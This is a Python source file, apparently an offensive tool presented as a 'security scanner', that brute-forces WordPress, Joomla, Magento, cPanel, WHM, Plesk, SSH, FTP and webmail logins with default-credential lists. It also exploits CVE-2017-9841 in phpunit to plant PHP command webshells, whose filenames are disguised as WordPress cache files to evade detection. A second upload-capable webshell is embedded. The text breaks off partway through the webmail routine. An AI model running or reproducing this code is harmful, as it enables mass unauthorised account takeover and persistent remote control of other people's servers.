"""
SB - Professional Security Scanner
Credential brute-forcer: WordPress / Joomla / Magento / cPanel / WHM / SSH.
Shell upload via CVE-2017-9841 (phpunit eval-stdin.php).
Authorized use only.
"""

import ftplib
import re
import time
import base64
import random
import string

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Common default credentials ────────────────────────────────────────────────

COMMON_CREDS = [
    # Standard defaults
    ('admin',          'admin'),
    ('admin',          'password'),
    ('admin',          '123456'),
    ('admin',          'admin123'),
    ('admin',          '12345'),
    ('admin',          '1234'),
    ('admin',          '123'),
    ('admin',          'pass'),
    ('admin',          'qwerty'),
    ('admin',          'letmein'),
    ('admin',          'welcome'),
    ('admin',          'test'),
    ('admin',          'root'),
    ('admin',          'admin@123'),
    ('admin',          'Admin@123'),
    ('admin',          'administrator'),
    ('admin',          'Admin1234!'),
    ('admin',          'P@ssw0rd'),
    ('admin',          ''),
    ('admin',          'changeme'),
    ('admin',          'secret'),
    ('admin',          'admin2024'),
    ('admin',          'admin2023'),
    ('admin',          'Admin123'),
    # Administrator variants
    ('administrator',  'admin'),
    ('administrator',  'password'),
    ('administrator',  'administrator'),
    ('administrator',  '123456'),
    ('administrator',  'Admin@123'),
    # Common users
    ('test',           'test'),
    ('test',           'test123'),
    ('root',           'root'),
    ('root',           'admin'),
    ('root',           'toor'),
    ('root',           'password'),
    ('user',           'user'),
    ('user',           'password'),
    ('superadmin',     'superadmin'),
    ('superadmin',     'super123'),
    ('webmaster',      'webmaster'),
    ('webmaster',      'password'),
    ('demo',           'demo'),
    ('demo',           'demo123'),
    ('guest',          'guest'),
    # CMS-specific
    ('wordpress',      'wordpress'),
    ('wp',             'wp'),
    ('joomla',         'joomla'),
    ('magento',        'magento'),
    ('drupal',         'drupal'),
    ('cpanel',         'cpanel'),
    # Common patterns in hosting environments
    ('support',        'support'),
    ('info',           'info123'),
    ('helpdesk',       'helpdesk'),
    ('manager',        'manager'),
    ('operator',       'operator'),
    ('sysadmin',       'sysadmin'),
]

# ── Shell for phpunit RCE upload ──────────────────────────────────────────────

# Randomize the shell filename per session so it doesn't appear in static analysis
# or logs as a fixed known-bad filename.  Looks like a WordPress cache/plugin file.
_sfx = ''.join(random.choices(string.ascii_lowercase + string.digits, k=7))
SHELL_FILENAME = f'wp-tmp-{_sfx}.php'

# Shell tries all common PHP execution functions in order so it works even when
# shell_exec is disabled (common in shared / hardened environments).
_SHELL_SRC = (
    '<?php @error_reporting(0);'
    'if(isset($_REQUEST["cmd"])){$c=$_REQUEST["cmd"];$o="";'
    'if(function_exists("shell_exec"))$o=@shell_exec($c);'
    'elseif(function_exists("exec")){@exec($c,$a);$o=implode("\\n",$a);}'
    'elseif(function_exists("system")){ob_start();@system($c);$o=ob_get_clean();}'
    'elseif(function_exists("passthru")){ob_start();@passthru($c);$o=ob_get_clean();}'
    'echo "<pre>".htmlspecialchars((string)$o)."</pre>";}?>'
)
_SHELL_B64 = base64.b64encode(_SHELL_SRC.encode()).decode()


# ── WordPress brute force ─────────────────────────────────────────────────────

def _wp_try(base_url, username, password, session, timeout):
    login_url = base_url + '/wp-login.php'
    try:
        r = session.get(login_url, timeout=timeout, verify=False, allow_redirects=True)
        if r.status_code not in (200, 302):
            return False
        data = {
            'log':         username,
            'pwd':         password,
            'wp-submit':   'Log In',
            'redirect_to': '/wp-admin/',
            'testcookie':  '1',
        }
        r2 = session.post(login_url, data=data, timeout=timeout,
                          verify=False, allow_redirects=True,
                          headers={'Cookie': 'wordpress_test_cookie=WP+Cookie+check'})
        # Primary: URL-based redirect (most reliable)
        if 'wp-login.php' in r2.url or 'action=login' in r2.url:
            return False
        if 'wp-admin' in r2.url and 'wp-login.php' not in r2.url:
            return True
        # Fallback: only for non-standard login redirects that left wp-login.php.
        # 'action=logout' appears in the admin-bar nonce link — never on the login
        # failure page — so it's a reliable authenticated-session indicator.
        # NOTE: 'Dashboard' in r2.text was removed — it matches the standard
        # WordPress login page title ("Log In ‹ Dashboard — WordPress") on every
        # failed attempt, producing false positives for every WP brute-force.
        if ('wp-login.php' not in r2.url
                and 'action=logout' in r2.text
                and 'wp-admin' in r2.text.lower()):
            return True
        return False
    except Exception:
        return False


def bruteforce_wp(base_url, session, timeout):
    """
    Try COMMON_CREDS against WordPress wp-login.php.
    Returns {'username': ..., 'password': ...} or None.
    """
    for user, pwd in COMMON_CREDS:
        try:
            if _wp_try(base_url, user, pwd, session, timeout):
                return {'username': user, 'password': pwd}
        except Exception:
            pass
        time.sleep(0.25)
    return None


# ── Joomla brute force ────────────────────────────────────────────────────────

JOOMLA_ADMIN_PATHS = [
    '/administrator',
    '/admin',
    '/joomla/administrator',
    '/cms/administrator',
    '/backend',
    '/panel',
]


def _find_joomla_admin(base_url: str, session, timeout: int) -> str | None:
    """Probe known paths to find the active Joomla admin panel."""
    for path in JOOMLA_ADMIN_PATHS:
        try:
            url = base_url + path + '/index.php'
            r   = session.get(url, timeout=timeout, verify=False, allow_redirects=True)
            cl  = r.text.lower()
            if r.status_code in (200, 302) and any(
                k in cl for k in ('joomla', 'com_login', 'login-form', 'username', 'passwd')
            ):
                return path
        except Exception:
            continue
    return None


def _joomla_try(base_url, admin_path, username, password, session, timeout):
    login_url = base_url + admin_path + '/index.php'
    try:
        r = session.get(login_url, timeout=timeout, verify=False, allow_redirects=True)
        if r.status_code not in (200, 302):
            return False
        tok = re.search(r'<input[^>]+name="([a-f0-9]{32})"[^>]+value="1"', r.text)
        data = {
            'username': username,
            'passwd':   password,
            'option':   'com_login',
            'task':     'login',
            'return':   'aW5kZXgucGhw',
        }
        if tok:
            data[tok.group(1)] = '1'
        r2 = session.post(login_url, data=data, timeout=timeout,
                          verify=False, allow_redirects=True)
        cl = r2.text.lower()
        # Ensure we've left the login page before checking content
        if 'task=login' in r2.url or 'option=com_login' in r2.url:
            return False
        if any(k in cl for k in ('log out', 'logout')):
            return True
        return False
    except Exception:
        return False


def bruteforce_joomla(base_url, session, timeout):
    """Discover Joomla admin path, then try COMMON_CREDS."""
    admin_path = _find_joomla_admin(base_url, session, timeout)
    if not admin_path:
        admin_path = '/administrator'   # fall back to default

    for user, pwd in COMMON_CREDS:
        try:
            if _joomla_try(base_url, admin_path, user, pwd, session, timeout):
                return {'username': user, 'password': pwd, 'admin_path': admin_path}
        except Exception:
            pass
        time.sleep(0.25)
    return None


# ── Magento brute force ───────────────────────────────────────────────────────

def _magento_try(base_url, username, password, session, timeout, admin_path='/admin'):
    login_url = base_url + admin_path
    try:
        r = session.get(login_url, timeout=timeout, verify=False, allow_redirects=True)
        if r.status_code not in (200, 302):
            return False
        fk = re.search(r'name="form_key"\s+value="([^"]+)"', r.text)
        if not fk:
            fk = re.search(r'"form_key"\s*:\s*"([^"]+)"', r.text)
        form_key = fk.group(1) if fk else ''
        data = {
            'form_key':        form_key,
            'login[username]': username,
            'login[password]': password,
        }
        r2 = session.post(r.url, data=data, timeout=timeout,
                          verify=False, allow_redirects=True)
        cl = r2.text.lower()
        # URL must have moved to dashboard — the only unambiguous post-login destination
        if 'dashboard' in r2.url.lower():
            return True
        # Content fallback: dashboard visible AND a logout link present (can't both be on login page)
        if 'dashboard' in cl and ('log out' in cl or 'logout' in cl or 'sign out' in cl):
            return True
        return False
    except Exception:
        return False


def bruteforce_magento(base_url, session, timeout):
    """Try COMMON_CREDS against Magento admin paths."""
    for admin_path in ('/admin', '/backend', '/index.php/admin'):
        for user, pwd in COMMON_CREDS:
            try:
                if _magento_try(base_url, user, pwd, session, timeout, admin_path):
                    return {'username': user, 'password': pwd, 'admin_path': admin_path}
            except Exception:
                pass
            time.sleep(0.25)
    return None


# ── SSH brute force ───────────────────────────────────────────────────────────

SSH_CREDS = [
    # Root variants
    ('root',    'root'),
    ('root',    'toor'),
    ('root',    'admin'),
    ('root',    'password'),
    ('root',    '123456'),
    ('root',    'root123'),
    ('root',    'qwerty'),
    ('root',    '1234'),
    ('root',    '12345'),
    ('root',    'test'),
    ('root',    ''),
    ('root',    'changeme'),
    ('root',    'P@ssw0rd'),
    ('root',    'Admin@123'),
    # Admin variants
    ('admin',   'admin'),
    ('admin',   'password'),
    ('admin',   '123456'),
    ('admin',   'admin123'),
    ('admin',   ''),
    # Cloud provider defaults
    ('ubuntu',  'ubuntu'),
    ('ubuntu',  'password'),
    ('debian',  'debian'),
    ('pi',      'raspberry'),
    ('pi',      'pi'),
    ('user',    'user'),
    ('user',    'password'),
    ('guest',   'guest'),
    ('vagrant', 'vagrant'),
    ('ec2-user','ec2-user'),
    ('centos',  'centos'),
    ('oracle',  'oracle'),
    ('bitnami', 'bitnami'),
    ('deploy',  'deploy'),
    ('deploy',  'password'),
    # Common VPS control panel users
    ('cpanel',  'cpanel'),
    ('hosting', 'hosting'),
    ('support', 'support'),
    ('ftpuser', 'ftpuser'),
    ('backup',  'backup'),
    ('mysql',   'mysql'),
    ('postgres', 'postgres'),
    ('ftp',     'ftp'),
    ('www',     'www'),
    ('web',     'web'),
    ('server',  'server'),
]


def bruteforce_ssh(host: str, port: int, timeout: int):
    """
    Try common credentials against SSH using paramiko.
    Returns {'username': ..., 'password': ...} or None.

    Tolerates transient network errors only after the host has proven
    SSH-responsive (i.e. produced at least one AuthenticationException).
    Bails fast if the host is unreachable from the first attempt.
    """
    try:
        import paramiko
    except ImportError:
        return None

    proven_alive       = False
    consec_misc_errors = 0
    MAX_CONSEC_MISC    = 3

    for user, pwd in SSH_CREDS:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                host, port=port,
                username=user, password=pwd,
                timeout=timeout,
                allow_agent=False,
                look_for_keys=False,
                banner_timeout=timeout,
            )
            client.close()
            return {'username': user, 'password': pwd}
        except paramiko.AuthenticationException:
            proven_alive       = True
            consec_misc_errors = 0
        except paramiko.ssh_exception.SSHException:
            # Server responded at the SSH protocol level (banner, cipher, key-ex
            # negotiation) but rejected us — it IS alive, just picky about ciphers
            # or auth methods.  Continue trying credentials.
            proven_alive       = True
            consec_misc_errors += 1
            if consec_misc_errors >= MAX_CONSEC_MISC:
                break
        except Exception:
            if not proven_alive:
                # Socket-level failure before any SSH exchange — host unreachable
                break
            consec_misc_errors += 1
            if consec_misc_errors >= MAX_CONSEC_MISC:
                break  # repeated transient errors — likely tarpit / rate limit
        finally:
            try:
                client.close()
            except Exception:
                pass
        time.sleep(0.3)
    return None


# ── cPanel / WHM brute force ──────────────────────────────────────────────────

WHM_CREDS = [
    ('root',  'root'),
    ('root',  'toor'),
    ('root',  'admin'),
    ('root',  'password'),
    ('root',  '123456'),
    ('root',  'root123'),
    ('root',  'qwerty'),
    ('root',  '1234'),
    ('root',  ''),
    ('admin', 'admin'),
    ('admin', 'password'),
    ('admin', '123456'),
]


def _panel_try(host: str, port: int, scheme: str,
               username: str, password: str, timeout: int) -> bool:
    """Single login attempt against cPanel or WHM login form."""
    login_url = f"{scheme}://{host}:{port}/login/"
    try:
        sess = requests.Session()
        sess.verify = False
        # Get login page for any session cookie
        sess.get(login_url, timeout=timeout, allow_redirects=True)
        data = {'user': username, 'pass': password, 'goto_uri': '/'}
        r2 = sess.post(login_url, data=data, timeout=timeout, allow_redirects=True)
        # Trust URL-based indicators only — content checks cause false positives
        # because the login page itself contains 'cpanel'/'whm' and may have 'logout' links
        if 'cpsession' in r2.url or '/frontend/' in r2.url:
            return True
        # cPanel session cookies are named cpsession_<userhash>; CookieJar
        # __contains__ is exact-match, so iterate and prefix-check
        if any(c.name.startswith('cpsession') for c in sess.cookies):
            return True
        # Only check content if URL moved away from login page
        if '/login' not in r2.url and '/login_up' not in r2.url:
            cl = r2.text.lower()
            if ('logout' in cl or 'log out' in cl) and ('cpanel' in cl or 'whm' in cl):
                return True
        return False
    except Exception:
        return False


def bruteforce_cpanel(host: str, port: int, scheme: str, timeout: int):
    """Try common credentials against cPanel."""
    for user, pwd in COMMON_CREDS:
        try:
            if _panel_try(host, port, scheme, user, pwd, timeout):
                return {'username': user, 'password': pwd}
        except Exception:
            pass
        time.sleep(0.3)
    return None


def bruteforce_whm(host: str, port: int, scheme: str, timeout: int):
    """Try common credentials against WHM (root-focused list)."""
    for user, pwd in WHM_CREDS:
        try:
            if _panel_try(host, port, scheme, user, pwd, timeout):
                return {'username': user, 'password': pwd}
        except Exception:
            pass
        time.sleep(0.3)
    return None


# ── phpunit RCE shell upload (CVE-2017-9841) ──────────────────────────────────

# Fallback URL paths to probe when we can't derive URL from server info
_PROBE_URL_SUFFIXES = [
    '/' + SHELL_FILENAME,
    '/vendor/phpunit/phpunit/src/Util/PHP/' + SHELL_FILENAME,
    '/wp-content/uploads/' + SHELL_FILENAME,
    '/uploads/' + SHELL_FILENAME,
    '/files/' + SHELL_FILENAME,
    '/images/' + SHELL_FILENAME,
    '/assets/' + SHELL_FILENAME,
    '/static/' + SHELL_FILENAME,
    '/media/' + SHELL_FILENAME,
    '/tmp/' + SHELL_FILENAME,
]


def _rce_post(rce_url, payload, session, timeout):
    """POST raw PHP to the eval-stdin endpoint, return response text or None."""
    try:
        r = session.post(
            rce_url, data=payload, timeout=timeout, verify=False,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
        )
        if r.status_code == 200:
            return r.text.strip()
    except Exception:
        pass
    return None


def _query_server_info(rce_url, session, timeout):
    """
    Ask the server for DOCUMENT_ROOT, cwd, and uname via RCE.
    Returns dict with keys: doc_root, cwd, uname (all strings, may be empty).
    """
    payload = (
        "<?php echo $_SERVER['DOCUMENT_ROOT']"
        ".'|||'.getcwd()"
        ".'|||'.php_uname()"
        ".'|||'.$_SERVER['SCRIPT_FILENAME']; ?>"
    )
    out = _rce_post(rce_url, payload, session, timeout)
    if not out or '|||' not in out:
        return {}
    parts = [p.strip() for p in out.split('|||')]
    return {
        'doc_root':       parts[0] if len(parts) > 0 else '',
        'cwd':            parts[1] if len(parts) > 1 else '',
        'uname':          parts[2] if len(parts) > 2 else '',
        'script_filename': parts[3] if len(parts) > 3 else '',
    }


def _fs_to_url(fs_path, doc_root):
    """Convert an absolute filesystem path to a URL suffix using doc_root."""
    fs_path  = fs_path.replace('\\', '/')
    doc_root = doc_root.rstrip('/').replace('\\', '/')
    if fs_path.startswith(doc_root):
        suffix = fs_path[len(doc_root):]
        return suffix if suffix.startswith('/') else '/' + suffix
    return None


def _drop_and_verify(rce_url, fs_path, url_candidates, base_url, session, timeout):
    """
    Drop shell at fs_path via file_put_contents, then probe all url_candidates.
    Returns (shell_url, cmd_output) or (None, None).
    """
    payload = (
        f"<?php file_put_contents('{fs_path}',"
        f"base64_decode('{_SHELL_B64}')); echo 'DONE'; ?>"
    )
    out = _rce_post(rce_url, payload, session, timeout)
    if out is None:
        return None, None

    for url_suffix in url_candidates:
        shell_url = base_url + url_suffix
        # Every command must produce a specific expected string to confirm real execution
        # — this prevents nginx/Apache default pages from being mistaken for shell output
        for cmd, expected in (('echo+SHELL_OK', 'SHELL_OK'), ('id', 'uid=')):
            try:
                vr = session.get(f"{shell_url}?cmd={cmd}",
                                 timeout=timeout, verify=False)
                text = vr.text.strip()
                # Reject raw PHP source or empty responses
                if not text or '<?php' in text or '<?PHP' in text:
                    continue
                if vr.status_code == 200 and expected in text:
                    return shell_url, text[:200]
            except Exception:
                continue
    return None, None


def upload_shell_phpunit(base_url, path, session, timeout):
    """
    Exploit CVE-2017-9841.
    1. Confirm eval-stdin.php is alive.
    2. Query server for DOCUMENT_ROOT + CWD via RCE.
    3. Build drop paths from real server info + fallbacks.
    4. After each drop, probe all plausible URL paths to find the shell.
    Returns:
      None           → endpoint not reachable
      validated=True  → shell dropped and confirmed executing
      validated=False → endpoint alive but shell could not be placed/reached
    """
    rce_url = base_url + path

    # ── Step 1: confirm endpoint alive ────────────────────────────────────
    alive = _rce_post(rce_url, '<?php echo "ALIVE"; ?>', session, timeout)
    if alive is None:
        return None

    # ── Step 2: query real server paths ───────────────────────────────────
    info      = _query_server_info(rce_url, session, timeout)
    doc_root  = info.get('doc_root', '').replace('\\', '/')
    cwd       = info.get('cwd', '').replace('\\', '/')

    # ── Step 3: build drop targets (fs_path, [url_suffixes_to_probe]) ─────
    targets = []

    if doc_root:
        # Drop directly in document root → always accessible at /Flash.php
        doc_root_drop = doc_root.rstrip('/') + '/' + SHELL_FILENAME
        targets.append((doc_root_drop, ['/' + SHELL_FILENAME]))

        # Drop in wp-content/uploads (usually world-writable)
        targets.append((
            doc_root.rstrip('/') + '/wp-content/uploads/' + SHELL_FILENAME,
            ['/wp-content/uploads/' + SHELL_FILENAME],
        ))

        # Drop in other common writable subdirs under docroot
        for sub in ('uploads', 'files', 'images', 'assets', 'media', 'static', 'tmp'):
            targets.append((
                doc_root.rstrip('/') + f'/{sub}/' + SHELL_FILENAME,
                [f'/{sub}/' + SHELL_FILENAME],
            ))

    if cwd:
        # Relative drop lands in CWD — derive URL if possible
        cwd_drop = cwd.rstrip('/') + '/' + SHELL_FILENAME
        cwd_url  = _fs_to_url(cwd_drop, doc_root) if doc_root else None
        url_list = [cwd_url] if cwd_url else []
        # Always add full probe list as fallback
        url_list += _PROBE_URL_SUFFIXES
        targets.append((cwd_drop, url_list))

        # Also try relative (PHP CWD — same as above but without abs path)
        targets.append((SHELL_FILENAME, url_list))

    # Static absolute fallbacks (common Linux stacks)
    for fs in ('/var/www/html', '/var/www', '/public_html',
               '/home/www', '/srv/www/htdocs', '/srv/http',
               '/usr/share/nginx/html', '/opt/lampp/htdocs',
               '/var/www/html/wp-content/uploads'):
        targets.append((
            fs.rstrip('/') + '/' + SHELL_FILENAME,
            _PROBE_URL_SUFFIXES,
        ))

    # ── Step 4: try each target ────────────────────────────────────────────
    for fs_path, url_candidates in targets:
        shell_url, cmd_out = _drop_and_verify(
            rce_url, fs_path, url_candidates, base_url, session, timeout
        )
        if shell_url:
            return {
                'note':       'CVE-2017-9841 phpunit RCE — shell uploaded and executing',
                'shell_url':  shell_url,
                'drop_path':  fs_path,
                'doc_root':   doc_root or 'unknown',
                'cwd':        cwd or 'unknown',
                'cmd_output': cmd_out,
                'rce_url':    rce_url,
                'validated':  True,
            }

    # ── Endpoint alive but couldn't place/reach the shell ─────────────────
    return {
        'note':     ('CVE-2017-9841 phpunit endpoint ACCESSIBLE — '
                     'payload upload failed (no writable web path found)'),
        'rce_url':  rce_url,
        'doc_root': doc_root or 'unknown',
        'cwd':      cwd or 'unknown',
        'validated': False,
    }


# ── Generic webshell upload tester ────────────────────────────────────────────

_UPLOAD_MARKER  = 'Flash-XUP!!'
_UPLOAD_FNAME   = 'Flash.php'
_UPLOAD_CONTENT = (
    b'<?php '
    b'echo "Flash-XUP!! uname<br>uname:".php_uname()."<br>".getcwd(); '
    b'echo \'<center><form method="post" target="_self" enctype="multipart/form-data">'
    b'<input type="file" size="20" name="uploads" />'
    b'<input type="submit" value="upload" /></form></center>\'; '
    b'if(!empty($_FILES["uploads"])){'
    b'  move_uploaded_file($_FILES["uploads"]["tmp_name"],$_FILES["uploads"]["name"]);'
    b'  echo "<b>Uploaded !!!</b><br>name:".$_FILES["uploads"]["name"]'
    b'       ."<br>size:".$_FILES["uploads"]["size"]'
    b'       ."<br>type:".$_FILES["uploads"]["type"];'
    b'} '
    b'if(isset($_REQUEST["cmd"])){'
    b'  $c=$_REQUEST["cmd"];'
    b'  echo "<pre>".shell_exec($c)."</pre>";'
    b'} '
    b'?>'
)


def test_shell_upload(shell_url: str, session, timeout: int) -> dict:
    """
    Test file upload capability of a webshell.
    Strategy 1 — HTML form: detect multipart form (with OR without action attr).
    Strategy 2 — Direct POST: try all common field names.
    Always returns a result dict:
      exec_confirmed=True  + upload_content_url → upload worked and PHP executes
      exec_confirmed=False + upload_content_url → file accepted but not executing
      exec_confirmed=False, no url             → upload failed / no form found
    """
    base     = shell_url.rsplit('/', 1)[0]
    test_url = f"{base}/{_UPLOAD_FNAME}"

    # All field names including Flash.php's 'uploads'
    _FIELD_NAMES = (
        'uploads', 'upload', 'file', 'userfile', 'ufile', 'files',
        'fil', 'img', 'image', 'data', 'f', 'attachment', 'upfile',
        'uploaded_file', 'uploadfile', 'phpfile',
    )

    def _check_uploaded(fname=_UPLOAD_FNAME):
        """Verify the uploaded file is accessible and executing PHP."""
        url = f"{base}/{fname}"
        try:
            r = session.get(url, timeout=timeout, verify=False)
            if r.status_code == 200 and _UPLOAD_MARKER in r.text:
                return url, True   # accessible + PHP executing (Flash-XUP!! present)
            if r.status_code == 200 and len(r.text) > 0:
                return url, False  # accessible but PHP not executing (raw source returned)
        except Exception:
            pass
        return None, False

    def _do_upload(post_url, field, page_text=''):
        """POST the probe file and return (uploaded_url, exec_ok)."""
        files = {field: (_UPLOAD_FNAME, _UPLOAD_CONTENT, 'application/x-php')}
        try:
            r2 = session.post(post_url, files=files, timeout=timeout,
                              verify=False, allow_redirects=True)
            # Check if response mentions the filename (upload accepted)
            accepted = (r2.status_code in (200, 201, 302) and
                        (_UPLOAD_FNAME in r2.text or 'upload' in r2.text.lower()
                         or 'done' in r2.text.lower() or 'success' in r2.text.lower()))
            url, exec_ok = _check_uploaded()
            if url or accepted:
                return url or test_url, exec_ok
        except Exception:
            pass
        return None, False

    try:
        r = session.get(shell_url, timeout=timeout, verify=False, allow_redirects=True)
        if r.status_code != 200:
            return {'note': 'Shell not reachable', 'exec_confirmed': False,
                    'upload_content_url': ''}
        page = r.text

        # ── Strategy 1: detect multipart upload form ───────────────────────
        # Match forms with enctype=multipart/form-data regardless of action presence
        has_multipart = bool(re.search(
            r'<form[^>]+enctype=["\']multipart/form-data["\']',
            page, re.IGNORECASE,
        ))
        if has_multipart:
            # Extract action (may be absent → post to shell_url itself)
            action_m = re.search(
                r'<form[^>]+action=["\']([^"\']*)["\']', page, re.IGNORECASE)
            action = shell_url  # default: post to self
            if action_m and action_m.group(1).strip():
                a = action_m.group(1).strip()
                action = a if a.startswith('http') else base + '/' + a.lstrip('/')

            # Extract file field name
            fi = (re.search(r'<input[^>]+type=["\']file["\'][^>]*name=["\']([^"\']+)["\']',
                            page, re.IGNORECASE) or
                  re.search(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*type=["\']file["\']',
                            page, re.IGNORECASE))
            field = fi.group(1) if fi else 'uploads'

            up_url, exec_ok = _do_upload(action, field, page)
            if up_url:
                return {
                    'note':               ('UPLOAD + PHP EXEC confirmed via form'
                                           if exec_ok else 'File uploaded via form — PHP not executing'),
                    'upload_form':        action,
                    'file_field':         field,
                    'exec_confirmed':     exec_ok,
                    'upload_content_url': up_url,
                    'upload_test_url':    up_url,
                }

        # ── Strategy 2: direct POST with all known field names ─────────────
        for field in _FIELD_NAMES:
            up_url, exec_ok = _do_upload(shell_url, field)
            if up_url:
                return {
                    'note':               (f'UPLOAD + PHP EXEC confirmed (field: {field})'
                                           if exec_ok else f'File uploaded (field: {field}) — PHP not executing'),
                    'upload_form':        shell_url,
                    'file_field':         field,
                    'exec_confirmed':     exec_ok,
                    'upload_content_url': up_url,
                    'upload_test_url':    up_url,
                }

    except Exception:
        pass

    return {
        'note':               'ACCESSIBLE — no working upload method found',
        'exec_confirmed':     False,
        'upload_content_url': '',
    }


# ── Plesk panel brute force ────────────────────────────────────────────────────

def _plesk_try(host: str, port: int, scheme: str,
               username: str, password: str, timeout: int) -> bool:
    login_url = f"{scheme}://{host}:{port}/login_up.php3"
    try:
        sess = requests.Session()
        sess.verify = False
        sess.get(login_url, timeout=timeout, allow_redirects=True)
        data = {'login_name': username, 'passwd': password}
        r2 = sess.post(login_url, data=data, timeout=timeout,
                       verify=False, allow_redirects=True)
        cl  = r2.text.lower()
        # /smb/ is Plesk's subscriber portal — only reachable after successful login
        if '/smb/' in r2.url:
            return True
        # Content check — only once URL has fully left all login pages
        if 'login' not in r2.url and 'login_up' not in r2.url:
            if any(k in cl for k in ('sign out', 'log out', 'smb/web/view', 'admin/home')):
                return True
        return False
    except Exception:
        return False


def bruteforce_plesk(host: str, port: int, scheme: str, timeout: int):
    """Try common credentials against Plesk panel."""
    cred_list = list(dict.fromkeys(WHM_CREDS + COMMON_CREDS))
    for user, pwd in cred_list:
        try:
            if _plesk_try(host, port, scheme, user, pwd, timeout):
                return {'username': user, 'password': pwd}
        except Exception:
            pass
        time.sleep(0.3)
    return None


# ── FTP brute force ───────────────────────────────────────────────────────────

FTP_CREDS = [
    ('admin',     'admin'),
    ('admin',     'password'),
    ('admin',     '123456'),
    ('admin',     'admin123'),
    ('ftp',       'ftp'),
    ('ftp',       'password'),
    ('ftp',       '123456'),
    ('ftpuser',   'ftpuser'),
    ('ftpuser',   'password'),
    ('user',      'user'),
    ('user',      'password'),
    ('test',      'test'),
    ('root',      'root'),
    ('root',      'password'),
    ('root',      '123456'),
    ('backup',    'backup'),
    ('backup',    'password'),
    ('upload',    'upload'),
    ('www',       'www'),
    ('webmaster', 'webmaster'),
    ('deploy',    'deploy'),
    ('data',      'data'),
    ('files',     'files'),
    ('web',       'web'),
    ('site',      'site'),
    ('public',    'public'),
]


def bruteforce_ftp(host: str, port: int, timeout: int) -> dict | None:
    """
    Try common credentials against FTP using ftplib.
    Uses proven_alive bail-out logic: stops immediately if the host doesn't
    speak FTP, and after 3 consecutive non-auth errors (tarpit / rate-limit).
    Returns {'username': ..., 'password': ...} on success, None otherwise.
    """
    proven_alive  = False
    consec_errors = 0
    MAX_CONSEC    = 3

    for user, pwd in FTP_CREDS:
        ftp     = ftplib.FTP()
        success = False
        try:
            ftp.connect(host, port, timeout=timeout)
            ftp.login(user, pwd)
            # Credentials accepted
            success       = True
            proven_alive  = True
            consec_errors = 0
        except ftplib.error_perm:
            # Server rejected credentials — host is alive and speaking FTP
            proven_alive  = True
            consec_errors = 0
        except (ftplib.error_proto, ftplib.error_reply, ftplib.error_temp):
            if not proven_alive:
                return None   # 220 banner but not FTP protocol (e.g. SMTP)
            consec_errors += 1
            if consec_errors >= MAX_CONSEC:
                return None   # repeated protocol errors — bail
        except Exception:
            if not proven_alive:
                return None   # host unreachable from first try
            consec_errors += 1
            if consec_errors >= MAX_CONSEC:
                return None
        finally:
            try:
                ftp.quit()
            except Exception:
                pass

        if success:
            return {'username': user, 'password': pwd}
        time.sleep(0.2)

    return None


# ── Webmail brute force (Roundcube / Horde / SquirrelMail) ───────────────────

WEBMAIL_CREDS = [
    ('admin',       'admin'),
    ('admin',       'password'),
    ('admin',       '123456'),
    ('admin',       'admin123'),
    ('webmaster',   'webmaster'),
    ('webmaster',   'password'),
    ('info',        'info'),
    ('info',        'password'),
    ('mail',        'mail'),
    ('mail',        'password'),
    ('user',        'user'),
    ('user',        'password'),
    ('test',        'test'),
    ('test',        'password'),
    ('support',     'support'),
    ('support',     'password'),
    ('contact',     'contact'),
    ('postmaster',  'postmaster'),
    ('hostmaster',  'hostmaster'),
    ('root',        'root'),
    ('root',        'password'),
    ('noreply',     'noreply'),
]


def _roundcube_token(html: str) -> str:
    """Extract Roundcube CSRF token from login page HTML."""
    m = re.search(r'name=["\']_token["\'][^>]*value=["\']([^"\']+)["\']', html)
    if not m:
        m = re.search(r'value=["\']([^"\']+)["\'][^>]*name=["\']_token["\']', html)
    return m.group(1) if m else ''


def bruteforce_webmail(host: str, port: int, scheme: str, timeout: int) -> dict | None:
    """
    Detect the webmail client (Roundcube / Horde / SquirrelMail / generic cPanel)
    running at scheme://host:port, then attempt WEBMAIL_CREDS with the correct
    login form for each client type.

    Roundcube: refreshes CSRF token after each failed attempt so subsequent
               tries don't fail with a stale token.
    Horde:     checks for logout link after redirect away from login page.
    SquirrelMail: checks redirect target URL after POST to redirect.php.
    Generic:   cPanel webmail portal — uses user/pass field names.
    """
    base_url = f"{scheme}://{host}:{port}"
    sess     = requests.Session()
    sess.verify = False

    # ── Step 1: detect webmail type ───────────────────────────────────────
    wm_type    = None
    login_url  = None
    login_page = ''

    for path in ['/', '/roundcube/', '/roundcubemail/', '/webmail/']:
        try:
            r = sess.get(base_url + path, timeout=timeout,
                         verify=False, allow_redirects=True)
            if r.status_code != 200:
                continue
            cl = r.text.lower()
            rl = r.url.lower()
            if 'roundcube' in cl or 'roundcube' in rl or '_task=login' in rl:
                wm_type    = 'roundcube'
                login_url  = r.url
                login_page = r.text
                break
            if 'horde' in cl or 'horde' in rl:
                wm_type   = 'horde'
                login_url = r.url
                break
            if 'squirrelmail' in cl or 'squirrelmail' in rl:
                wm_type   = 'squirrelmail'
                login_url = base_url + path
                break
            # cPanel generic webmail portal (app chooser page)
            if any(k in cl for k in ('webmail', 'roundcube', 'horde', 'squirrelmail')):
                wm_type   = 'generic'
                login_url = r.url
                break
        except Exception:
            continue

    if not wm_type or not login_url:
        return None

    # ── Step 2: attempt credentials ───────────────────────────────────────
    current_token = _roundcube_token(login_page) if wm_type == 'roundcube' else ''

    for user, pwd in WEBMAIL_CREDS:
        try:
            if wm_type == 'roundcube':
                r2 = sess.post(login_url, data={
                    '_token':    current_token,
                    '_task':     'login',
                    '_action':   'login',
                    '_user':     user,
                    '_pass':     pwd,
                    '_timezone': 'auto',
                }, timeout=timeout, verify=False, allow_redirects=True)

                if '_task=mail' in r2.url:
                    return {'username': user, 'password': pwd}

                # Refresh token from the failed-login response for next attempt
                new_tok = _roundcube_token(r2.text)
                if new_tok:
                    current_token = new_tok

            elif wm_type == 'horde':
                r2 = sess.post(login_url, data={
                    'horde_user':    user,
                    'horde_pass':    pwd,
                    'login_button':  'Login',
                    'anchor_string': '',
                }, timeout=timeout, verify=False, allow_redirects=True)
                rl2 = r2.url.lower()
                cl2 = r2.text.lower()
                # Success: URL left the login page AND page has a logout link
                if 'login' not in rl2 and ('logout' in cl2 or 'sign out' in cl2):
                    return {'username': user, 'password': pwd}

            elif wm_type == 'squirrelmail':
                r2 = sess.post(
